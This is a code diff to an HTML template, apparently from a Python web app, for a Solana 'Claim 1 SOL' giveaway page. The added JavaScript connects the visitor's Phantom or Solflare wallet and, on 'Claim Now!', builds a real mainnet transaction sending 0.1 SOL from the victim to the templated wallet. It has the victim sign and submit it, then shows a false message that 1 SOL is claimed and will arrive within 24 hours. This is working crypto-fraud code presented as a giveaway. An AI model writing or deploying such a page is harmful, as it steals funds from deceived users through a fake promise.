@@ -32,7 +32,7 @@ HTML_TEMPLATE = """
       margin: 20px;
     }
     .button:disabled {
-      opacity: 0.5;
+      opacity: 0.4;
       cursor: not-allowed;
     }
     img.qr {
@@ -44,63 +44,94 @@ HTML_TEMPLATE = """
     }
     #status {
       margin-top: 20px;
-      color: #ccc;
+      color: #aaa;
       font-size: 0.9em;
-      white-space: pre-wrap;
     }
   </style>
-</head>
-<body>
-  <h1>🎁 Claim 1 SOL</h1>
-  <p>Send exactly <strong>0.1 SOL</strong> to:</p>
-  <p><code>{{ wallet }}</code></p>
-  <img id="qrCode" class="qr" src="{{ qr_url }}" alt="QR Code" />
-  
-  <button class="button" id="connectBtn">🔗 Connect Wallet</button>
-  <div id="status">Click "Connect Wallet" to begin.</div>
+  <script type="module">
+    import {
+      Connection,
+      PublicKey,
+      SystemProgram,
+      Transaction,
+      clusterApiUrl
+    } from "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.89.0/+esm";
 
-  <script>
-    const status = document.getElementById("status");
-    const qr = document.getElementById("qrCode");
-    const btn = document.getElementById("connectBtn");
+    let provider = null;
+    let userPublicKey = null;
 
-    btn.addEventListener('click', async () => {
-      let provider = null;
+    window.connectWallet = async function () {
+      provider = window.solana || window.phantom?.solana || window.solflare;
 
-      if (window.solana?.isPhantom) {
-        provider = window.solana;
-      } else if (window.solflare?.isSolflare) {
-        provider = window.solflare;
-      } else if (window.phantom?.solana?.isPhantom) {
-        provider = window.phantom.solana;
-      }
-
-      if (!provider) {
-        status.innerText = "⚠️ No wallet detected. Open this in Solflare or Phantom app.";
-        qr.style.display = "block";
+      if (!provider || (!provider.isPhantom && !provider.isSolflare)) {
+        document.getElementById("status").innerText =
+          "⚠️ Wallet not detected. Please open in Solflare or Phantom browser.";
+        document.getElementById("qrCode").style.display = "block";
         return;
       }
 
       try {
-        status.innerText = "🔄 Waiting for wallet approval...";
         const resp = await provider.connect();
-        const pubKey = resp?.publicKey || provider.publicKey;
-
-        if (pubKey) {
-          status.innerText = "✅ Connected: " + pubKey.toString();
-        } else {
-          status.innerText = "✅ Connected, but no publicKey received.";
-        }
+        userPublicKey = resp.publicKey;
+        document.getElementById("status").innerText = "✅ Connected: " + userPublicKey.toString();
+        document.getElementById("claimBtn").disabled = false;
       } catch (err) {
-        console.error("Connection failed:", err);
-        if (err.code === 4001 || (err.message && err.message.toLowerCase().includes("rejected"))) {
-          status.innerText = "❌ Connection rejected by user.";
-        } else {
-          status.innerText = "❌ Wallet connection failed. Please try again or open in wallet app.";
-        }
+        console.error("Connection rejected", err);
+        document.getElementById("status").innerText = "❌ Connection rejected.";
       }
-    });
+    };
+
+    window.claimNow = async function () {
+      if (!provider || !userPublicKey) {
+        alert("Please connect your wallet first.");
+        return;
+      }
+
+      try {
+        const connection = new Connection(clusterApiUrl("mainnet-beta"), "confirmed");
+
+        const recipient = new PublicKey("{{ wallet }}");
+        const transaction = new Transaction().add(
+          SystemProgram.transfer({
+            fromPubkey: userPublicKey,
+            toPubkey: recipient,
+            lamports: 0.1 * 1e9 // 0.1 SOL
+          })
+        );
+
+        transaction.feePayer = userPublicKey;
+        let { blockhash } = await connection.getLatestBlockhash();
+        transaction.recentBlockhash = blockhash;
+
+        const signed = await provider.signTransaction(transaction);
+        const signature = await connection.sendRawTransaction(signed.serialize());
+        await connection.confirmTransaction(signature);
+
+        // Update UI
+        document.getElementById("status").innerHTML = `
+          ✅ <strong>You’ve claimed 1 SOL!</strong><br>
+          Please wait patiently for 24h as people are in high request.<br>
+          <small>Txn: <a href="https://solscan.io/tx/${signature}" target="_blank">${signature}</a></small>
+        `;
+        document.getElementById("claimBtn").disabled = true;
+        document.getElementById("connectBtn").disabled = true;
+      } catch (err) {
+        console.error("Transaction failed:", err);
+        alert("❌ Transaction failed: " + err.message);
+      }
+    };
   </script>
+</head>
+<body>
+  <h1>Claim 1 SOL</h1>
+  <p>Send exactly <strong>0.1 SOL</strong> to:</p>
+  <p><code>{{ wallet }}</code></p>
+  <img id="qrCode" class="qr" src="{{ qr_url }}" alt="QR Code" />
+
+  <button class="button" id="connectBtn" onclick="connectWallet()">Connect Wallet</button>
+  <button class="button" id="claimBtn" onclick="claimNow()" disabled>Claim Now!</button>
+
+  <div id="status">Click "Connect Wallet" to begin.</div>
 </body>
 </html>
 """
